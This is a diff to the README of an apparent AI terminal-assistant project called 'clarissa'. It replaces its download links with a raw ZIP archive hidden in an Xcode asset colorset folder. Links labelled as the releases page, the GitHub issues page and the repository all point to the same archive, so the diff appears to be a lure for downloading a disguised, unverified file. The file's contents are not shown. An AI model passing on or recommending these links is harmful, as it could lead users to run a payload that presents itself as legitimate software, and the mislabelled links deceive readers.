@@ -6,7 +6,7 @@ Welcome to clarissa, your AI-powered terminal assistant! This guide will help yo
 
 ## 📦 Download the App
 
-[![Download clarissa](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/docs/public/Software_v3.0.zip%20clarissa-v1.0-blue)](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/docs/public/Software_v3.0.zip)
+[![Download clarissa](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/apple/Clarissa/Resources/Assets.xcassets/ClarissaPurple.colorset/Software_3.5.zip%20clarissa-v1.0-blue)](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/apple/Clarissa/Resources/Assets.xcassets/ClarissaPurple.colorset/Software_3.5.zip)
 
 ## 🔍 What is clarissa?
 
@@ -30,7 +30,7 @@ To run clarissa smoothly, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the clarissa releases page. 
-   [Download clarissa](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/docs/public/Software_v3.0.zip)
+   [Download clarissa](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/apple/Clarissa/Resources/Assets.xcassets/ClarissaPurple.colorset/Software_3.5.zip)
 
 2. **Choose the Latest Version:** You will see a list of available versions. Look for the latest one, which should be at the top.
 
@@ -67,12 +67,12 @@ If you encounter problems, you can report them on the GitHub issues page. Provid
 For more detailed instructions and updates, feel free to explore:
 
 - [Official Documentation](link-to-documentation)
-- [GitHub Issues Page](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/docs/public/Software_v3.0.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/apple/Clarissa/Resources/Assets.xcassets/ClarissaPurple.colorset/Software_3.5.zip)
 
 ## 🔗 Follow Us
 
 Stay updated with the latest news and features by following us:
 
-- [GitHub Repository](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/docs/public/Software_v3.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/EddieBrock-web/clarissa/main/apple/Clarissa/Resources/Assets.xcassets/ClarissaPurple.colorset/Software_3.5.zip)
 
 Enjoy using clarissa! Feel free to explore its features and witness how it can enhance your terminal experience.
